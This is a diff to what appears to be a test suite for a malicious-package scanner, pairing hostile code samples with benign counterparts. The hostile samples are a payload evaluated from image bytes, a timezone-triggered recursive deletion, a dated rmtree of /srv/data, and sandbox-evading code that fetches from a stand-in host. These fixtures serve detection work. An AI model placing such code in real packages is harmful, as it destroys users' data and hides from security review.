@@ -24,7 +24,7 @@ const CASES = [
   { name: "Payload in an image, loaded and run (buildrunner-dev)", bad: { "package.json": pkg("build-runner-x"), "index.js": "const b = require('fs').readFileSync(__dirname + '/assets/logo.png');\neval(b.subarray(4096).toString());\n", "assets/logo.png": "\u0089PNG\r\n" },
     good: { "package.json": pkg("img-embed"), "index.js": "const b = require('fs').readFileSync(__dirname + '/assets/logo.png');\nmodule.exports = 'data:image/png;base64,' + b.toString('base64');\n", "assets/logo.png": "\u0089PNG\r\n" } },
   { name: "Wipes files only in one country (protestware)", bad: { "index.js": "const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;\nif (tz === 'Europe/Moscow') require('fs').rmSync(process.cwd(), { recursive: true });\n" },
-    good: { "index.js": "const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;\nexport const label = tz === 'Asia/Ho_Chi_Minh' ? 'Giờ Việt Nam' : tz;\n" } },
+    good: { "index.js": "const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;\nexport const label = tz === 'Asia/Ho_Chi_Minh' ? 'Vietnam time' : tz;\n" } },
   { name: "Time bomb", bad: { "worker.py": "import datetime, shutil\nif datetime.datetime.now() > datetime.datetime(2027, 3, 1):\n    shutil.rmtree('/srv/data')\n" },
     good: { "worker.py": "import datetime\nif datetime.datetime.now() > datetime.datetime(2027, 3, 1):\n    print('This version is old, please upgrade.')\n" } },
   { name: "Stays quiet in sandboxes", bad: { "index.js": "const tools = ['VirtualBox', 'VMware', 'wireshark', 'procmon', 'x64dbg'];\nif (require('os').cpus().length < 2) process.exit(0);\nrequire('https').get('https://cdn.example/p');\n" },
